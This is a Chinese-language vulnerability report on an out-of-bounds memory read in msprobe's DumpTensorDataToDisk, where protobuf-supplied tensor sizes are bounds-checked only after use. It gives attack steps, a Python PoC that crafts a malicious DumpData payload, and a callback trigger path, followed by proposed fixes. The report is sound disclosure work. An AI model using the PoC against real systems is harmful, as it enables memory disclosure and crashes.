# 漏洞报告: adump-core-003 - Protobuf tensor.size() 越界访问

## 基本信息

| 项目 | 内容 |
|------|------|
| **漏洞ID** | adump-core-003 |
| **CWE分类** | CWE-787 (Out-of-bounds Write) / CWE-125 (Out-of-bounds Read) |
| **置信度** | 95% (确认真实漏洞) |
| **严重程度** | 高 |
| **影响版本** | msprobe 当前版本 |
| **漏洞文件** | `ccsrc/adump/core/AclDumpDataProcessor.cpp` |
| **漏洞函数** | `DumpTensorDataToDisk` |
| **漏洞代码行** | 806-827 |

## 漏洞概述

在 `DumpTensorDataToDisk` 函数中，处理 Protobuf 解析的 tensor 数据时，边界检查存在严重的时序问题：**边界检查在数据访问之后进行**，导致潜在的越界内存读取。

攻击者通过构造恶意的 Protobuf `DumpData` 消息（特别是篡改 `OpInput.size` 或 `OpOutput.size` 字段），可以导致：
1. **越界内存读取**: 从缓冲区之外的地址读取数据
2. **信息泄露**: 读取的越界数据会被写入磁盘文件
3. **潜在的越界写入**: 如果后续处理涉及写入操作

## 漏洞代码分析

### 数据流追踪

```
AclDumpCallBack (AclDumper.cpp:326)
    ↓
PushData (AclDumpDataProcessor.cpp:286)
    ↓
ConcatenateData (AclDumpDataProcessor.cpp:350)
    ↓
DumpToDisk (AclDumpDataProcessor.cpp:886)
    ↓
DumpTensorDataToDisk (AclDumpDataProcessor.cpp:799-827)
```

### 漏洞代码 (AclDumpDataProcessor.cpp:806-827)

```cpp
static DebuggerErrno DumpTensorDataToDisk(const std::string& dumpPath, AclDumpMsg::DumpData& dumpData,
                                          const uint8_t* data, size_t dataLen, std::vector<DebuggerSummaryOption>& opt)
{
    DEBUG_FUNC_TRACE();
    std::vector<AclTensorInfo> aclTensorInfos;
    uint64_t offset = 0;
    uint32_t slot = 0;
    
    // 漏洞点1: 循环中累加 offset，但没有检查每次累加后是否越界
    for (auto& tensor : dumpData.input()) {
        // 漏洞点2: data + offset 可能在此时已经越界
        aclTensorInfos.push_back(AclTensor::ParseAttrsFromDumpData(dumpPath, data + offset, tensor, "input", slot));
        offset += tensor.size();  // 漏洞点3: tensor.size() 来自 Protobuf，可被攻击者控制
        slot++;
    }

    slot = 0;
    for (auto& tensor : dumpData.output()) {
        aclTensorInfos.push_back(AclTensor::ParseAttrsFromDumpData(dumpPath, data + offset, tensor, "output", slot));
        offset += tensor.size();
        slot++;
    }

    if (aclTensorInfos.empty()) {
        return DebuggerErrno::OK;
    }

    // 漏洞点4: 边界检查太晚！此时越界访问已经发生
    if (offset > dataLen) {
        LOG_ERROR(DebuggerErrno::ERROR_VALUE_OVERFLOW, dumpPath + ": offset overflow " + std::to_string(offset) + "/" +
                  std::to_string(dataLen) + ".");
        return DebuggerErrno::ERROR_VALUE_OVERFLOW;
    }
    // ... 后续处理会访问 aclTensorInfos 中的数据 ...
}
```

### Protobuf 消息定义 (AclDumpMsg.proto)

```protobuf
message OpInput {
  OutputDataType data_type = 1;
  OutputFormat format = 2;
  Shape shape = 3;
  bytes data = 4;
  uint64 size = 5;          // 攻击者可控的 size 字段！
  Shape original_shape = 6;
  int32 sub_format = 7;
}

message DumpData {
  string version = 1;
  uint64 dump_time = 2;
  repeated OpOutput output = 3;
  repeated OpInput input = 4;   // 输入列表
  repeated OpBuffer buffer = 5;
  string op_name = 6;
}
```

### 越界数据使用 (AclDumpDataProcessor.cpp:647, 685)

```cpp
// 在 DumpOneAclTensor 函数中，越界的指针被用来读取数据：
ofs.write(reinterpret_cast<const char*>(tensor.aclData), tensor.dataSize);
// 或
FileOperation::DumpNpy(dumpPathSlot, tensor.aclData, tensor.dataSize, ...);
```

## 攻击场景分析

### 场景1: 数据段结构

数据缓冲区布局：
```
[8 bytes: headerSegLen][headerSegLen bytes: Protobuf DumpData][dataSegLen bytes: binary data]
     ↑                        ↑                                    ↑
     |                        |                                    data 指针
     |                        dumpData.ParseFromArray
     headerSegOffset
```

### 场景2: 攻击向量

攻击者可以构造以下恶意数据：

1. **篡改 headerSegLen**: 
   - 数据前8字节控制 Protobuf 头部长度
   - 可以使 Protobuf 解析指向错误位置

2. **篡改 Protobuf size 字段**:
   - 在 `DumpData.input[0].size` 设置为 `dataSegLen - 1`
   - 在 `DumpData.input[1].size` 设置为任意值
   - 当处理 `input[1]` 时，`data + offset` 已经指向缓冲区外

### 场景3: 具体攻击步骤

假设 `dataSegLen = 0x1000`:

```
步骤1: 解析 Protobuf DumpData
  - input[0].size = 0xFFF (接近 dataSegLen)
  - input[1].size = 0x1000 (任意值)

步骤2: 处理 input[0]
  - offset = 0
  - ParseAttrsFromDumpData(data + 0, tensor[0], ...)  // 安全
  - offset += 0xFFF → offset = 0xFFF

步骤3: 处理 input[1] (越界!)
  - offset = 0xFFF (已接近 dataSegLen)
  - ParseAttrsFromDumpData(data + 0xFFF, tensor[1], ...)  // 可能越界
  - 如果 tensor[1].dataSize > 1, 后续 ofs.write() 会读取越界内存

步骤4: 边界检查 (太晚!)
  - if (offset > dataLen) → 检查在越界访问之后
```

## PoC 构造思路

### 1. 构造恶意 dump 文件

```python
# 伪代码
import struct
from generated import acl_dump_msg_pb2

# 创建恶意 DumpData
dump_data = acl_dump_msg_pb2.DumpData()
dump_data.version = "1.0"
dump_data.op_name = "malicious_op"

# 第一个 input: 正常大小
input1 = dump_data.input.add()
input1.data_type = 1  # DT_FLOAT
input1.format = 0     # FORMAT_NCHW
input1.size = 0xFFF   # 接近 dataSegLen，为第二个 input 制造越界条件

# 第二个 input: 导致越界
input2 = dump_data.input.add()
input2.data_type = 1
input2.format = 0
input2.size = 0x1000  # 任意值，将导致越界读取

# 序列化
header_bytes = dump_data.SerializeToString()
header_len = len(header_bytes)

# 构造完整文件
# [header_len (8 bytes)][header_bytes][data_segment]
payload = struct.pack('<Q', header_len) + header_bytes + b'\x00' * 0x1000

# 保存到文件或通过 ACL API 回调注入
```

### 2. 触发路径

```
1. 通过 ACL API 注册回调: acldumpRegCallback
2. 构造 AclDumpChunk 结构:
   - fileName: 目标 dump 文件路径
   - bufLen: payload 大小
   - isLastChunk: 1
   - dataBuf: 恶意 payload
3. 触发回调 -> PushData -> ConcatenateData -> DumpToDisk
4. DumpTensorDataToDisk 执行时触发越界
```

### 3. 利用效果

- **信息泄露**: 越界读取的内存会被写入 `.bin` 或 `.npy` 文件
- **崩溃**: 如果读取无效内存地址，可能导致程序崩溃
- **潜在写入**: 如果越界地址恰好是可写内存，可能造成数据破坏

## 影响范围

### 受影响的代码路径

1. **直接调用链**:
   - `AclDumper::OnAclDumpCallBack` → `PushData` → `DumpToDisk` → `DumpTensorDataToDisk`

2. **数据来源**:
   - ACL (Ascend Computing Language) API 回调
   - 硬件层 dump 数据
   - 可能被篡改的 dump 文件

3. **影响功能**:
   - Tensor 数据 dump
   - 统计数据 dump
   - 溢出检测数据 dump

### 影响评估

| 维度 | 评估 |
|------|------|
| **攻击复杂度** | 中等 - 需要理解 Protobuf 格式和 ACL dump 机制 |
| **权限要求** | 需要能够控制 dump 数据来源（文件或 API） |
| **用户交互** | 无需用户交互 |
| **影响机密性** | 高 - 可泄露任意可读内存内容 |
| **影响完整性** | 中 - 可能导致内存破坏 |
| **影响可用性** | 高 - 可导致程序崩溃 |

## 修复建议

### 方案1: 在循环中添加实时边界检查

```cpp
static DebuggerErrno DumpTensorDataToDisk(const std::string& dumpPath, AclDumpMsg::DumpData& dumpData,
                                          const uint8_t* data, size_t dataLen, std::vector<DebuggerSummaryOption>& opt)
{
    DEBUG_FUNC_TRACE();
    std::vector<AclTensorInfo> aclTensorInfos;
    uint64_t offset = 0;
    uint32_t slot = 0;
    
    for (auto& tensor : dumpData.input()) {
        // 修复: 在访问前检查边界
        if (offset + tensor.size() > dataLen) {
            LOG_ERROR(DebuggerErrno::ERROR_VALUE_OVERFLOW, 
                      dumpPath + ": input[" + std::to_string(slot) + "] size overflow: offset=" + 
                      std::to_string(offset) + ", size=" + std::to_string(tensor.size()) + 
                      ", dataLen=" + std::to_string(dataLen));
            return DebuggerErrno::ERROR_VALUE_OVERFLOW;
        }
        
        aclTensorInfos.push_back(AclTensor::ParseAttrsFromDumpData(dumpPath, data + offset, tensor, "input", slot));
        offset += tensor.size();
        slot++;
    }

    slot = 0;
    for (auto& tensor : dumpData.output()) {
        // 修复: 同样的边界检查
        if (offset + tensor.size() > dataLen) {
            LOG_ERROR(DebuggerErrno::ERROR_VALUE_OVERFLOW,
                      dumpPath + ": output[" + std::to_string(slot) + "] size overflow: offset=" +
                      std::to_string(offset) + ", size=" + std::to_string(tensor.size()) +
                      ", dataLen=" + std::to_string(dataLen));
            return DebuggerErrno::ERROR_VALUE_OVERFLOW;
        }
        
        aclTensorInfos.push_back(AclTensor::ParseAttrsFromDumpData(dumpPath, data + offset, tensor, "output", slot));
        offset += tensor.size();
        slot++;
    }

    // ... 其余代码 ...
}
```

### 方案2: 在 ParseAttrsFromDumpData 中添加边界验证

```cpp
template <typename T>
AclTensorInfo ParseAttrsFromDumpData(const std::string& dumpPath, const uint8_t* data, const T& tensor,
                                     const std::string& io, uint32_t slot, size_t maxDataLen)
{
    size_t dataSize = static_cast<size_t>(tensor.size());
    
    // 添加数据大小验证
    if (dataSize > maxDataLen) {
        throw std::runtime_error(dumpPath + ": " + io + "[" + std::to_string(slot) + 
                                 "] size exceeds maximum allowed: " + std::to_string(dataSize) + 
                                 " > " + std::to_string(maxDataLen));
    }
    
    // ... 其余代码 ...
}
```

### 方案3: 验证 Protobuf 数据完整性

在 `ConcatenateData` 或 `DumpToDisk` 开始时，先遍历所有 tensor.size() 并验证总和不超过 dataSegLen：

```cpp
// 在 DumpTensorDataToDisk 开头添加预检查
uint64_t totalSize = 0;
for (const auto& tensor : dumpData.input()) {
    totalSize += tensor.size();
    if (totalSize > dataLen) {
        LOG_ERROR(...);
        return DebuggerErrno::ERROR_VALUE_OVERFLOW;
    }
}
for (const auto& tensor : dumpData.output()) {
    totalSize += tensor.size();
    if (totalSize > dataLen) {
        LOG_ERROR(...);
        return DebuggerErrno::ERROR_VALUE_OVERFLOW;
    }
}
```

## 附加信息

### 相关代码位置

| 文件 | 行号 | 描述 |
|------|------|------|
| AclDumpDataProcessor.cpp | 806-827 | 漏洞主函数 |
| AclDumpDataProcessor.cpp | 647 | 越界读取点 (ofs.write) |
| AclDumpDataProcessor.cpp | 685 | 越界读取点 (DumpNpy) |
| AclTensor.cpp | 312-360 | ParseAttrsFromDumpData 函数 |
| AclDumpMsg.proto | 116-124 | OpInput 消息定义 |
| AclDumper.cpp | 381-423 | 回调入口点 |

### 测试建议

1. **单元测试**: 添加测试用例验证 size 字段边界
2. **模糊测试**: 对 Protobuf 解析进行 fuzzing
3. **静态分析**: 启用更严格的边界检查警告

### 参考资料

- CWE-787: Out-of-bounds Write
- CWE-125: Out-of-bounds Read
- Protobuf 安全最佳实践
